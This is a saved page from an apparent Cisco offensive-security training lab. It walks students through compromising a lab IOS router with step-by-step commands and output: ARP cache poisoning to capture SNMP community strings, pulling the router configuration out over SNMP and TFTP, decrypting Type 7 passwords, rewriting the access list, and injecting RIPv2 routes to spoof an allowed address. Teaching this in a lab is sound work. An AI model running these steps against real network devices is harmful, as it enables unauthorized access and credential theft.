<!DOCTYPE html>
<!-- saved from url=(0042)http://opflex.ciscolive.com/pod1/basics/os -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta http-equiv="cache-control" content="max-age=0">
            <meta http-equiv="cache-control" content="no-cache">
            <meta http-equiv="expires" content="0">
            <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT">
            <meta http-equiv="pragma" content="no-cache">
            <link href="./os_files/bootstrap.min.css" rel="stylesheet" media="screen">
            <link href="./os_files/github.css" rel="stylesheet">
            <link href="./os_files/cerulean.css" rel="stylesheet">
            <link href="./os_files/whitebackgroundmenu.css" rel="stylesheet">
            <link rel="stylesheet" href="./os_files/font-awesome.min.css">
            <link href="./os_files/style.css" rel="stylesheet">
            <link href="./os_files/cssterm.css" rel="stylesheet">
            <link href="./os_files/bootstrap-select.min.css" rel="stylesheet">

            <title>BAH Module 4</title>
             <meta name="author" content="Omar Santos">

</head>
<body>


	<div class="container">
		<nav class="navbar navbar-default navbar-fixed-top" id="ltraci-navbar" role="navigation">
		  <div class="container-fluid">
		    <!-- Brand and toggle get grouped for better mobile display -->
		    <div class="navbar-header">

			        <a href="index.html" class="navbar-brand"><div class="pn-noncollapse">Becoming a Hacker</div></a>

		      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
		        <span class="sr-only">Toggle navigation</span>
		        <span class="icon-bar navbar-inverse"></span>
		        <span class="icon-bar"></span>
		        <span class="icon-bar"></span>
		      </button>
		    </div>
		    <!-- Collect the nav links, forms, and other content for toggling -->
		    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
		      <ul class="nav navbar-nav">


		        <li class="dropdown">
		          <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">Menu<span class="caret"></span></a>
		          <ul class="dropdown-menu multi-column columns-3" role="menu" style="font-size:.7em;">
			          <div class="row">
				          <div class="col-sm-3">
					          <ul class="multi-column-dropdown">
										<li class="dropdown-header">Module 1</li>
										  <li>
                       <a href="#">No labs</a>
                      </li>
                    </ul>
				          </div>

                  <div class="col-sm-3">
					          <ul class="multi-column-dropdown">
										<li class="dropdown-header">Module 2</li>
										  <li>
                       <a href="module2.html">Passive Reconnissaince</a>
                      </li>
                    </ul>
				          </div>

                  <div class="col-sm-3">
                    <ul class="multi-column-dropdown">
                    <li class="dropdown-header">Module 3</li>
                      <li>
                       <a href="module3.html">Active Reconnissaince</a>
                      </li>
                    </ul>
                  </div>

                  <div class="col-sm-3">
                    <ul class="multi-column-dropdown">
                    <li class="dropdown-header">Module 4</li>
                      <li>
                       <a href="module4.html">Networking</a>
                      </li>
                    </ul>
                  </div>

                  <div class="col-sm-3">
                    <ul class="multi-column-dropdown">
                    <li class="dropdown-header">Module 5</li>
                      <li>
                       <a href="module5.html">Wireless</a>
                      </li>
                    </ul>
                  </div>

                  <div class="col-sm-3">
                    <ul class="multi-column-dropdown">
                    <li class="dropdown-header">Module 6</li>
                      <li>
                       <a href="module6.html">Web Applications</a>
                      </li>
                    </ul>
                  </div>

                  <div class="col-sm-3">
                    <ul class="multi-column-dropdown">
                    <li class="dropdown-header">Module 7</li>
                      <li>
                       <a href="module7.html">Accounts and Passwords</a>
                      </li>
                    </ul>
                  </div>

                  <div class="col-sm-3">
					          <ul class="multi-column-dropdown">
										<li class="dropdown-header">Module 8</li>
										  <li>
                       <a href="module8.html">Overflows</a>
                      </li>
                    </ul>
				          </div>


               </div>
               </ul>
               </li>



				<li class="ciscoliveitem"><a target="blank" href="resources.html">Resources</a></li>
				<li class="ciscoliveitem"><a target="blank" data-toggle="modal" data-target="#ABOUT" href="#">About</a></li>

		      </ul>

		    </div><!-- /.navbar-collapse  width="30px" -->
		  </div><!-- /.container-fluid -->
		</nav>
		</div>


    <div class="modal fade" id="ABOUT" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
      <div class="modal-dialog modal-lg">
        <div class="modal-content">
          <div class="modal-header">
            <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
            <h3 class="modal-title" id="myModalLabel">Becoming a Hacker Training</h3>
          </div>
          <div class="modal-body">
    		<div class="row">
                <div class="col-lg-4 col-md-4 col-sm-6 col-xs-12">
                    <img src="./os_files/hacker.png" class="img-responsive">
                </div>
                <div class="col-lg-8 col-md-8 col-sm-6 col-xs-12">
                    <p>
                        The purpose of this lab is to provide the student a better understanding of offensive security.
                    </p>
                    <p>
                        Navigate to the <a href="resources.html"> Resources </a> page to obtain the presentations used in this class, as well as other resources on how to build your own lab.
                    </p>
                </div>
            </div>
            <div class="row">
              <p>

              </p>
            </div>
    		<div class="row" style="margin-top:20px;">
    			<div class="col-lg-4 col-md-4 col-sm-12 col-xs-12">
    				<strong>Chris McCoy</strong><br>
                    Hacker, ASIG<br>
    				cmm@cisco.com<br>
    			</div>
    			<div class="col-lg-4 col-md-4 col-sm-12 col-xs-12">
    				<strong>Everett Stiles</strong><br>
                    Hacker, ASIG<br>
    				estiles@cisco.com<br>
    			</div>
    			<div class="col-lg-4 col-md-4 col-sm-12 col-xs-12">
    				<strong>Omar Ωr Santos</strong><br>
                    Peasant, PSIRT<br>
    				os@cisco.com<br>
    			</div>
    		</div>
          </div>
          <div class="modal-footer">
            <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
          </div>
        </div>
      </div>
    </div>

</div>

		<!-- <div class="container"> -->
			<!-- <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12"> -->



<div class="container">
<h1>Networking</h1>
 In this module, break into the IOS router at the center of the network using TELNET and a locally configured username and password.


<h2>Exercise 1 : Grab the Complete Router Configuration and Decrypt Passwords</h2>

<img src="os_files/seccon-becoming-a-hacker-net-topo.png" width="75%" height="75%">

<hr><br>
A partial router configuration is provided:

<pre>
hostname router
!
interface Loopback0
 ip address 192.168.3.1 255.255.255.255
!
logging host 192.168.1.4
!
snmp-server community <community-string> RW 1
snmp-server host 192.168.1.4 version 2c <community-string>
!
access-list 1 permit 192.168.1.4 log
access-list 2 permit 192.168.1.5 log
access-list 2 permit 192.168.4.1 log
!
line vty 0 4
 access-class 2 in
 transport input ssh telnet

</pre>

<h3>Task 1</h3>

<p>Using&nbsp;<tt>tshark</tt>&nbsp;or&nbsp;<a class="http" href="http://wiresharkdownloads.riverbed.com/video/wireshark/introduction-to-wireshark/">Wireshark</a>, discover the SNMPv2 community string used in Traps sent to&nbsp;<strong>windows.seccon.ninja</strong>. The Get/Set community string uses the same password.  Use ARP cache poisoning against the router to send the SNMPv2 trap to your kali box instead of windows.</p>

<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<a target="blank" data-toggle="modal" data-target="#Hint11" href="#">+ Click here for Hint</a>
<div class="modal fade" id="Hint11" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Hint </h3>
      </div>
      <div class="modal-body">
    <div class="row">

      <pre>
        root@bah-pod1-kali:~# <strong> host windows.seccon.ninja</strong>
        windows.seccon.ninja has address 192.168.1.4
        root@bah-pod1-kali:~# <strong> scapy</strong>
        Welcome to Scapy (2.2.0)
        >>> arpcachepoison('192.168.1.1','192.168.1.4')
        .
        Sent 1 packets.
        .^Z
        [1]+  Stopped                 sudo scapy


        root@bah-pod1-kali:~# <strong> bg</strong>
        [1]+ sudo scapy &

        root@bah-pod1-kali:~# <strong> tshark -i eth1 -V udp port 162</strong>
        Capturing on 'eth1'
        Frame 1: 443 bytes on wire (3544 bits), 443 bytes captured (3544 bits) on interface 0
        ...
        Simple Network Management Protocol
            version: v2c (1)
            community: *****
            data: snmpV2-trap (7)
                snmpV2-trap
                    request-id: 5114
                    error-status: noError (0)
                    error-index: 0
                    variable-bindings: 15 items
        ...
      </pre>

        </div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
      </div>
    </div>
</div>
</div>

<!--end hint -->




<h3>Task 2</h3>

<p>Using the discovered SNMPv2 community string and the&nbsp;<a class="http" href="http://tools.cisco.com/Support/SNMP/do/BrowseMIB.do?local=en&amp;mibName=CISCO-CONFIG-COPY-MIB">Cisco-Config-Copy-MIB</a>, make the router upload its configuration via TFTP to&nbsp;<strong>kali.seccon.ninja</strong>. The uploaded configuration should be placed in&nbsp;<tt>/srv/tftp</tt>. A tool using&nbsp;<a class="http" href="http://www.secdev.org/projects/scapy/doc/">Scapy</a>&nbsp;is provided to help you with this. (&nbsp;<tt>~/labs/networking/get-cisco-cfg.py</tt>&nbsp;) An access control list (ACL) configured on the router is blocking you--<strong>bypass it!</strong>&nbsp;Verify the TFTP server is running:</p>


 <!-- this is a copy /paste block - put the title and the code you want to copy and paste - or ask Omar -->
 <div class="topbar">
   <div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Netstat</div>
   <div class="topbarbutton"></div> </div>
 <div class="commandblock"> <div class="copyseqnumber"> 1 <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-1">Copy</button></div>
 <div class="ciscohl2" id="copy-1" style="background: url(&quot;/static/images/ok.png&quot;) right bottom / 45px 45px no-repeat rgb(224, 255, 203);">
   <!-- put the code here -->
   <pre>
 netstat -lun | grep 69
   </pre>
   </div></div>
   <!-- end of copy /paste block -->

<hr><br>

<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<a target="blank" data-toggle="modal" data-target="#Hint1" href="#">+ Click here for Hint</a>
<div class="modal fade" id="Hint1" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Hint </h3>
      </div>
      <div class="modal-body">
    <div class="row">

Help for get-cisco-cfg.py.
      <pre>
        root@bah-pod1-kali:~/labs/networking# ./get-cisco-cfg.py -h
        WARNING: No route found for IPv6 destination :: (no default route?)
        Usage: get-cisco-cfg.py [options]

        Options:
          -h, --help            show this help message and exit
          -i IFACE, --iface=IFACE
                                Interface
          -s SRCIP, --src=SRCIP
                                Source IP Address
          -d DSTIP, --dst=DSTIP
                                Destination IP Address
          -t TFTPIP, --tftp=TFTPIP
                                TFTP Server IP Address
          -f CFG_FILE, --cfg=CFG_FILE
                                Configuration Filename
          -c SNMPSTRING, --community=SNMPSTRING
                                SNMP Community Set String
      </pre>

        </div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
      </div>
    </div>
</div>
</div>

<!--end hint -->


<br><br>


     <!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
     <a target="blank" data-toggle="modal" data-target="#Cheat2" href="#"> ++ Click here for Cheat</a>
     <div class="modal fade" id="Cheat2" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
       <div class="modal-dialog modal-lg">
         <div class="modal-content">
           <div class="modal-header">
             <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
             <h3 class="modal-title" id="myModalLabel">Cheat </h3>
           </div>
           <div class="modal-body">
         <div class="row">

     Running get-cisco-cfg.py
           <pre>
     root@bah-pod1-kali:~/labs/networking# ./get-cisco-cfg.py -i eth1 -s 192.168.1.4 -d 192.168.1.1 -t 192.168.2.2 -f my-config -c <removed>
     WARNING: No route found for IPv6 destination :: (no default route?)
     Attempting to download IOS config from 192.168.1.1
     .
     Sent 1 packets.
     .
     Sent 1 packets.
     .
     Sent 1 packets.
     .
     Sent 1 packets.
     .
     Sent 1 packets.
     .
     Sent 1 packets.
     .
     Sent 1 packets.
           </pre>

     <hr><br>
     Viewing TFTP configuration

     <pre>
     root@bah-pod1-kali:~/labs/networking# more tftp/my-config
     !
     version 15.5
     service timestamps debug datetime msec
     service timestamps log datetime msec
     service password-encryption
     !
     hostname router
     !
     boot-start-marker
     boot-end-marker
     !
     !
     ...
     </pre>

             </div>
           </div>
           <div class="modal-footer">
             <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
           </div>
         </div>
     </div>
     </div>

     <!--end hint -->

     <hr>



<h3>Task 3</h3>

<p>The administrator password is weakly encrypted with the Type 7 scheme. Decrypt the administrator password using the&nbsp;<tt>ciscodecrypt</tt>tool. You'll have to build the tool using the provided&nbsp;<a class="http" href="http://en.wikipedia.org/wiki/Makefile#Execution">Makefile</a>. Here's an example of use:</p>

<pre>
  root@bah-pod1-kali:~/labs/networking/ciscodecrypt# ./ciscodecrypt -p 0518030C22434048
  password: seccon!
</pre>


<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<a target="blank" data-toggle="modal" data-target="#Cheat1" href="#"> ++ Click here for Cheat</a>
<div class="modal fade" id="Cheat1" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Cheat </h3>
      </div>
      <div class="modal-body">
    <div class="row">

Building ciscodecrypt
      <pre>
root@bah-pod1-kali:~/labs/networking/ciscodecrypt# make
cc  -o ciscodecrypt  ciscodecrypt.c
ciscodecrypt.c: In function ‘cdecrypt’:
ciscodecrypt.c:28:12: warning: incompatible implicit declaration of built-in function ‘strlen’ [enabled by default]
ciscodecrypt.c: In function ‘main’:
ciscodecrypt.c:140:44: warning: incompatible implicit declaration of built-in function ‘strlen’ [enabled by default]
      </pre>


<hr><br>

Running ciscodecrypt

<pre>
root@bah-pod1-kali:~/labs/networking# more tftp/my-config
root@bah-pod1-kali:~/labs/networking/ciscodecrypt# ./ciscodecrypt -p 0955411C54174711004D
password: &lt;removed&gt;
root@bah-pod1-kali:~/labs/networking/ciscodecrypt# ./ciscodecrypt -p 0818696F213B24352B
password: &lt;removed&gt;
...
</pre>

        </div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
      </div>
    </div>
</div>
</div>

<!--end hint -->

<hr>


<h2>Exercise 2 : Break into the IOS router at the center of the network using TELNET and the administrator username and password.</h2>

<h3>Task 1</h3>
<p>The administrator is only allowed to log in from&nbsp;<strong>metasploitable.seccon.ninja</strong>. Without logging into this machine, figure out how to bypass this. See the&nbsp;<strong>Bonus</strong>&nbsp;section below.</p>


<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<a target="blank" data-toggle="modal" data-target="#Cheat3" href="#"> ++ Click here for Cheat</a>
<div class="modal fade" id="Cheat3" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Cheat </h3>
      </div>
      <div class="modal-body">
    <div class="row">

Edit /srv/tftp/to-apply.cfg

<pre>
root@bah-pod1-kali:~/labs/networking# nano /srv/tftp/to-apply.cfg
</pre>
<pre>
root@bah-pod1-kali:~/labs/networking# cat /srv/tftp/to-apply.cfg
!
no access-list 2
access-list 2 permit 192.168.1.4
access-list 2 permit 192.168.4.1
access-list 2 permit 192.168.2.2
!
! Don't forget end! :-)
end
.
</pre>

<hr><br>
Merge configuration

<pre>
root@bah-pod1-kali:~/labs/networking# sudo ./merge-cisco-cfg.py -i eth1 -s 192.168.1.4 -d 192.168.1.1 -t 192.168.2.2 -f to-apply.cfg -c &lt;removed&gt;
WARNING: No route found for IPv6 destination :: (no default route?)
Attempting to upload IOS config to 192.168.1.1
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.

</pre>
<hr><br>
Log in
<pre>
root@bah-pod1-kali:~/labs/networking# telnet router

                                NOTICE

  Use of this system is RESTRICTED. Access is limited to individuals
  authorized by Cisco SecCon...

Username: admin
Password:
...
router#
</pre>
        </div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
      </div>
    </div>
</div>
</div>

<!--end hint -->

<hr>

<h3>Bonus</h3>
Do this without changing the router's running configuration to bypass the configured ACL or using ARP cache poisoning. <br>



<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<a target="blank" data-toggle="modal" data-target="#Cheat4" href="#"> ++ Click here for Cheat</a>
<div class="modal fade" id="Cheat4" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Cheat</h3>
      </div>
      <div class="modal-body">
    <div class="row">

Discover the RIPv2 Password
<pre>
root@bah-pod1-kali:~/labs/networking# tshark -i eth2 -V udp port 520
Capturing on 'eth2'
Frame 1: 106 bytes on wire (848 bits), 106 bytes captured (848 bits) on interface 0
    Interface id: 0
...
Routing Information Protocol
    Command: Response (2)
    Version: RIPv2 (2)
    Authentication: Simple Password
        Authentication type: Simple Password (2)
        Password: &lt;removed&gt;
</pre>
<hr><br>

Configure IP Address for Overridden Route
<pre>
root@bah-pod1-kali:~/labs/networking# ip route
default via 192.168.1.1 dev eth1
169.254.169.254 via 192.168.0.100 dev eth0
192.168.0.0/24 dev eth0  proto kernel  scope link  src 192.168.0.104
192.168.1.0/24 dev eth1  proto kernel  scope link  src 192.168.1.2
192.168.2.0/24 dev eth2  proto kernel  scope link  src 192.168.2.2
192.168.4.248/29 via 192.168.0.254 dev eth0
seccon@pod-XX-kali:~/labs/networking$ sudo ip address add 192.168.1.5/32 dev eth2
seccon@pod-XX-kali:~/labs/networking$ sudo ip route add 192.168.3.1/32 via 192.168.2.1 src 192.168.1.5
seccon@pod-XX-kali:~/labs/networking$ ip route
default via 192.168.1.1 dev eth1
169.254.169.254 via 192.168.0.100 dev eth0
192.168.0.0/24 dev eth0  proto kernel  scope link  src 192.168.0.104
192.168.1.0/24 dev eth1  proto kernel  scope link  src 192.168.1.2
192.168.2.0/24 dev eth2  proto kernel  scope link  src 192.168.2.2
192.168.3.1 via 192.168.2.1 dev eth2  src 192.168.1.5
192.168.4.248/29 via 192.168.0.254 dev eth0
</pre>
<hr><br>


Inject RIPv2 Route
<pre>
root@bah-pod1-kali:~/labs/networking# ./inject.py -h
WARNING: No route found for IPv6 destination :: (no default route?)
Usage: inject.py [options]

Options:
  -h, --help            show this help message and exit
  -i IFACE, --iface=IFACE
                        Interface
  -p PASSWORD, --password=PASSWORD
                        RIPv2 Password
  -r ROUTE, --route=ROUTE
                        RIPv2 Prefix
  -m MASK, --mask=MASK  RIPv2 Subnet Mask
seccon@pod-XX-kali:~/labs/networking$ sudo ./inject.py -i eth2 -p <removed> -r 192.168.1.5 -m 255.255.255.255
WARNING: No route found for IPv6 destination :: (no default route?)
Attempting to inject RIPv2 route.  It will last about 240 seconds
.
Sent 1 packets.

</pre>
<hr><br>

Log in
<pre>
root@bah-pod1-kali:~/labs/networking# telnet 192.168.3.1
...
User Access Verification

Username: admin
Password:
...
router#
</pre>
</div>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>

<!--end hint -->





<div class="nextsection">
    <div style="float:left; font-size: .9em;">

    </div>
    <div style="float:right; font-size: .9em;">

            <div class="btn-group">
                <button type="button" class="btn btn-md btn-success" onclick="window.location.href=&#39;module5.html&#39;">Next: Module 5</button>
                <button type="button" class="btn btn-md btn-success" onclick="window.location.href=&#39;module5.html&#39;">
                        <span class="glyphicon glyphicon-chevron-right" style="color:white;" aria-hidden="true"></span>
                </button>
            </div>

    </div>
</div>

</div><!-- Whole page container -->

			<!-- </div> -->
    	<!--- </div> -->
        <span style="font-size:.7em; color:0x696969; float:right;margin:30px 20px 0px 0px;">© Copyright Cisco Systems</span>



<script src="./os_files/jquery.min.js"></script>
<script src="./os_files/bootstrap.min.js"></script>
<!-- <script src="/static/js/ZeroClipboard.js" type="text/javascript"></script> -->
<script src="./os_files/highlight.pack.js"></script>
<script type="text/javascript" src="./os_files/sijax.js"></script>
<script type="text/javascript" src="./os_files/cssterm.js"></script>
<script type="text/javascript" src="./os_files/clipboard.min.js"></script>
<script type="text/javascript" src="./os_files/bootstrap-select.min.js"></script>
<script type="text/javascript">
    Sijax.setRequestUri("/pod1/basics/os");Sijax.setJsonUri("/static/js/sijax/json2.js");
</script>


<script type="text/javascript">
var urlParams;
(window.onpopstate = function () {
    var match,
        pl     = /\+/g,  // Regex for replacing addition symbol with a space
        search = /([^&=]+)=?([^&]*)/g,
        decode = function (s) { return decodeURIComponent(s.replace(pl, " ")); },
        query  = window.location.search.substring(1);

    urlParams = {};
    while (match = search.exec(query))
       urlParams[decode(match[1])] = decode(match[2]);
})();

// Config ZeroClipboard
//ZeroClipboard.config({
//    hoverClass: 'btn-clipboard-hover'
//})

// Insert copy to clipboard button before .ciscohl
//$('.ciscohl').each(function () {
//    var btnHtml = '<div class="zero-clipboard"><span class="btn-clipboard">Copy</span></div>';
//    $(this).before(btnHtml)
//});

function runit(codeid){
    var codeblock = "codeblock-" + codeid;
    var preblock =  "output-" + codeid;
    var outfixhtmlfunc = 'outputfixhtml' + codeid;
    var code = document.getElementById(codeblock).value;
	document.getElementById(preblock).innerHTML = '';
    Sk.configure({output:eval(outfixhtmlfunc) });
    eval(Sk.importMainWithBody("<stdin>", false, code));
}





//var zeroClipboard = new ZeroClipboard($('.btn-clipboard'));
//var htmlBridge = $('#global-zeroclipboard-html-bridge');
//
//// Handlers for ZeroClipboard
//zeroClipboard.on('ready', function (event) {
//    htmlBridge
//        .data('placement', 'top')
//        .attr('title', 'Copy to clipboard')
//        .tooltip();
//    var ciscohl = $(event.target).parent().nextAll('.ciscohl').first();
//    console.log(ciscohl);
//
//    // Copy to clipboard
//    zeroClipboard.on('copy', function (event) {
//        var ciscohl = $(event.target).parent().nextAll('.ciscohl').first();
//        console.log ( ciscohl[0].id );
//        var pod = urlParams["pod"];
//        var section = urlParams["section"];
//
//        $.ajax({
//	       //type: "GET",
//	       url: "/dash/collect/pod/1/basics/os/" + ciscohl[0].id
//	       // data:  "pod=" + pod + "&section=" + section + "&step=" + ciscohl[0].id
//        });
//        event.clipboardData.setData("text/plain", ciscohl.text());
//         // $(event.target).parent().next(".ciscohl").css("background","#e0ffcb url('/static/images/ok.png') no-repeat top left / 45px 45px")
//         $(event.target).parent().next(".ciscohl").css("background","#e0ffcb url('/static/images/ok.png') no-repeat bottom right / 45px 45px")
//    });
//
//    // Notify copy success and reset tooltip title
//    zeroClipboard.on('aftercopy', function () {
//        htmlBridge
//            .attr('title', 'Copied!')
//            .tooltip('fixTitle')
//            .tooltip('show')
//            .attr('title', 'Copy to clipboard')
//            .tooltip('fixTitle');
//
//    });
//});
//
//function findPos(obj) {
//    var curtop = 0;
//    if (obj.offsetParent) {
//        do {
//            curtop += obj.offsetTop;
//        } while (obj = obj.offsetParent);
//    return [curtop];
//    }
//}
//
//
//// Notify copy failure
//zeroClipboard.on('error', function () {
//    ZeroClipboard.destroy();
//    htmlBridge
//        .attr('title', 'Flash required')
//        .tooltip('fixTitle')
//        .tooltip('show');
//});
//

///////////////////////////////////////////////////////////////////////////////
// Start NEW COPY/PASTE Clipboard code.
///////////////////////////////////////////////////////////////////////////////

var clipboard = new Clipboard('.copybutton', {
    text: function(btn_object){
        var webcopy = $(btn_object).parent().nextAll('.ciscohl2').first();
        return webcopy[0].innerText + "\n\r";
    }
});
clipboard.on('success', function(e) {
    var webcopy = $(event.target).parent().nextAll('.ciscohl2').first();
    var pod = urlParams["pod"];
    var section = urlParams["section"];

    $.ajax({
        url: "/dash/collect/pod/1/basics/os/" + webcopy[0].id
    });
    $(event.target).parent().next(".ciscohl2").css("background","#e0ffcb url('/static/images/ok.png') no-repeat bottom right / 45px 45px")

    e.clearSelection();
});
///////////////////////////////////////////////////////////////////////////////
// End COPY/PASTE Clipboard code.
///////////////////////////////////////////////////////////////////////////////



$(document).ready(function(){
   // cache the window object
   $window = $(window);

    $('.selectpicker').selectpicker({
          style: 'btn-default',
          size: 12
      });






    // $('pre code').each(function(i, block) {
    //     hljs.highlightBlock(block);
    // });

   $('section[data-type="background"]').each(function(){
     // declare the variable to affect the defined data-type
     var $scroll = $(this);

      $(window).scroll(function() {
        // HTML5 proves useful for helping with creating JS functions!
        // also, negative value because we're scrolling upwards
        var yPos = -($window.scrollTop() / $scroll.data('speed'));

        // background position
        var coords = '50% '+ yPos + 'px';

        // move the background
        $scroll.css({ backgroundPosition: coords });
      }); // end window scroll
   });  // end section function
}); // close out script


</script>

<textarea readonly="" style="font-size: 12pt; border: 0px; padding: 0px; margin: 0px; position: absolute; left: -9999px; top: 0px;"></textarea></body></html>
